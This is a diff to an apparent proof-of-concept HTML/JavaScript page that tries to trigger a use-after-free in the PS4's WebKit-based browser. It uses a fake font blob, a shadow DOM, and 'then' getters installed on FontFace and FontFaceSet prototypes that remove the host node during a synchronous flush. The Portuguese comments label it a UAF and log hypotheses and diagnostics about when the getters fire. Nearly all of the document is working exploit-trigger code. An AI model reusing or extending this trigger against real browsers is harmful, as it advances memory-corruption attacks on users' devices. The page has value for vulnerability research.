@@ -3,10 +3,6 @@
 <html>
 <body>
 <script>
-// CORRECAO PRINCIPAL:
-// No PS4, o flush ocorre DURANTE o shadowRoot.prepend() (eager flush síncrono).
-// O getter precisa estar instalado ANTES do prepend, não depois.
-
 document.fonts;
 
 function log(msg) {
@@ -15,11 +11,11 @@ function log(msg) {
 }
 
 function run() {
+    // --- Setup Shadow DOM ---
     const host = document.createElement("div");
     document.body.appendChild(host);
     const shadowRoot = host.attachShadow({ mode: "open" });
 
-    // Blob URL: loading state garantido durante toda execucao sincrona
     const fakeOtf = new Uint8Array(500 * 1024);
     for (let i = 0; i < fakeOtf.length; i++) fakeOtf[i] = i & 0xFF;
     const blob = new Blob([fakeOtf], { type: "font/otf" });
@@ -38,58 +34,114 @@ function run() {
 
     document.body.offsetHeight;
     document.fonts.load("24px reentryFont", "A");
-    log("status: " + document.fonts.status);
 
-    // Materializa a promise ANTES do getter (necessario para thenable assimilation)
+    // Materializa faces individuais (H1: FontFace.loaded thenable path)
+    let shadowFace = null;
+    document.fonts.forEach(f => {
+        const fam = f.family.trim().replace(/['"]/g, '');
+        if (fam === 'reentryFont') {
+            shadowFace = f;
+            void f.loaded; // materializa promise individual
+        }
+    });
+    log("shadowFace encontrado: " + !!shadowFace);
+    log("shadowFace.status: " + (shadowFace ? shadowFace.status : "N/A"));
+
+    // Materializa fonts.ready (caminho original)
     document.fonts.ready;
 
-    // ============================================================
-    // CORRECAO: instalar getter ANTES do prepend
-    // O PS4 faz flush síncrono durante prepend(), o getter
-    // precisa estar no lugar quando flushPendingDescendantUpdates()
-    // chamar completedLoading() → resolve fonts.ready
-    // ============================================================
-    let getterCallCount = 0;
-    Object.defineProperty(FontFaceSet.prototype, "then", {
+    // ================================================================
+    // INSTALAR AMBOS OS GETTERS antes do prepend
+    // ================================================================
+
+    // H1: FontFace.prototype.then (confirmado em 5 testes no PS4)
+    let ffGetterCount = 0;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            delete FontFace.prototype.then;
+            ++ffGetterCount;
+            const fam = this.family || '?';
+            const st  = this.status  || '?';
+            log(">>> FontFace.prototype.then! family=" + fam + " status=" + st);
+            host.remove(); // UAF: libera no iterado
+            return undefined;
+        }
+    });
+
+    // H2: FontFaceSet.prototype.then (caminho original do commit)
+    let ffsGetterCount = 0;
+    Object.defineProperty(FontFaceSet.prototype, 'then', {
         configurable: true,
         get() {
             delete FontFaceSet.prototype.then;
-            ++getterCallCount;
-            log(">>> GETTER DISPAROU! count=" + getterCallCount);
-            // Remove o host: libera o no iterado em m_inDocumentShadowRoots → UAF
+            ++ffsGetterCount;
+            log(">>> FontFaceSet.prototype.then! status=" + document.fonts.status);
             host.remove();
             return undefined;
         }
     });
-    log("getter instalado. status=" + document.fonts.status);
 
-    // O prepend agora encontra o getter no lugar
-    // No PS4: prepend → flush síncrono → completedLoading → fonts.ready settle
-    //         → thenable check em FontFaceSet → getter DISPARA → host.remove()
+    log("ambos getters instalados. status=" + document.fonts.status);
+
+    // ================================================================
+    // TRIGGER: prepend (flush síncrono no PS4)
+    // ================================================================
     const prependedStyle = document.createElement("style");
     prependedStyle.textContent = ".unused { color: red; }";
-    shadowRoot.prepend(prependedStyle);  // ← flush acontece AQUI
+    shadowRoot.prepend(prependedStyle);
 
-    log("apos prepend: getter=" + getterCallCount + " status=" + document.fonts.status);
+    log("apos prepend: FF=" + ffGetterCount + " FFS=" + ffsGetterCount
+        + " status=" + document.fonts.status);
 
-    // Triggers adicionais caso o flush seja lazy no PS4
-    if (getterCallCount === 0) {
-        document.styleSheets.length;
-        log("apos styleSheets.length: getter=" + getterCallCount);
-    }
-    if (getterCallCount === 0) {
-        document.body.offsetHeight;
-        log("apos offsetHeight: getter=" + getterCallCount);
-    }
-    if (getterCallCount === 0) {
-        const canvas = document.createElement("canvas");
-        canvas.getContext("2d").font = "24px reentryFont";
-        canvas.getContext("2d").measureText("A");
-        log("apos measureText: getter=" + getterCallCount);
+    // ================================================================
+    // DIAGNOSTICO H2: testar se completedLoading usa JSPromise::resolve
+    // Verificar o tipo do valor resolvido pela ready promise
+    // ================================================================
+    if (ffGetterCount === 0 && ffsGetterCount === 0) {
+        log("--- DIAGNOSTICO EXTRA ---");
+
+        // Verifica se fonts.ready ja resolveu e com que valor
+        document.fonts.ready.then
+            ? log("fonts.ready.then existe (promise nao resolvida ou thenable)")
+            : log("fonts.ready.then ausente");
+
+        // Tenta forcar completedLoading via face.load() (padrao UAF_CSSFontFace_load)
+        let ffCount2 = 0;
+        Object.defineProperty(FontFace.prototype, 'then', {
+            configurable: true,
+            get() {
+                delete FontFace.prototype.then;
+                ++ffCount2;
+                log(">>> FontFace.then via face.load path! status=" + this.status);
+                return undefined;
+            }
+        });
+        if (shadowFace) {
+            shadowFace.load();
+            log("apos shadowFace.load(): getter=" + ffCount2);
+        }
+
+        // Testa se measureText com a fonte dispara qualquer getter
+        let ffCount3 = 0;
+        Object.defineProperty(FontFace.prototype, 'then', {
+            configurable: true,
+            get() {
+                delete FontFace.prototype.then;
+                ++ffCount3;
+                log(">>> FontFace.then via measureText! status=" + this.status);
+                return undefined;
+            }
+        });
+        const cv = document.createElement("canvas");
+        cv.getContext("2d").font = "24px reentryFont";
+        cv.getContext("2d").measureText("A");
+        log("apos measureText: getter=" + ffCount3);
     }
 
-    log("--- RESULTADO ---");
-    log("getter total: " + getterCallCount);
+    log("--- RESULTADO FINAL ---");
+    log("FontFace.prototype.then total: " + ffGetterCount);
+    log("FontFaceSet.prototype.then total: " + ffsGetterCount);
     log("status final: " + document.fonts.status);
     log("PASS se nao travou.");
 }
